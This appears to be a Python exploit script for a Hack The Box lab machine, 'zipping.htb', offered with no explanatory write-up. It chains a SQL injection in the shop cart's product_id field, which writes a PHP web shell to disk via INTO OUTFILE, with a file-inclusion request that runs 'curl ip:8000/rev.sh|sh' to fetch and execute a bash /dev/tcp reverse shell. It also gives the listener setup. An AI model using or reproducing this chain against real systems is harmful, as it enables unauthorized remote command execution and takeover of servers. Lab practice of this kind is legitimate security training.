import requests
import sys
import random

url = "http://zipping.htb"

def backdoor():
    endpoint = '/shop/index.php?page=cart'
    # session.proxies.update({'http': 'http://127.0.0.1:8080'}) # debug

    # https://stackoverflow.com/questions/58160504/how-do-i-write-files-using-sql-injection
    print("[!] Crafting Payload")
    backdoor = '<?php system($_GET["cmd"]);?>'
    SQLi = f"\n';SELECT '{backdoor}' INTO OUTFILE '/var/lib/mysql/{idx}.php' #1"
    body = {
        "quantity": 1,
        "product_id": SQLi
    }

    print("[!] Sending Payload")
    session.post(url + endpoint, data=body)

def reverse_shell():
    with open("rev.sh", "wb+") as file:
        file.write(f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1'\n".encode())

    cmd = f'curl {ip}:8000/rev.sh|sh'
    endpoint = f'/shop/index.php?page=/var/lib/mysql/{idx}&cmd={cmd}'

    session.get(url + endpoint)


if __name__ == '__main__':
    print("[!] Make sure to setup a python server and nc listener")
    print("\tpython -m http.server")
    print("\tnc -lnvp <port>\n")

    if len(sys.argv) < 3:
        print("Usage: <ip> <port>")
        exit(1)
    
    global session, ip, port, idx
    session = requests.session()
    ip = sys.argv[1]
    port = sys.argv[2]
    idx = random.randint(1, 1000)
    
    backdoor()
    reverse_shell()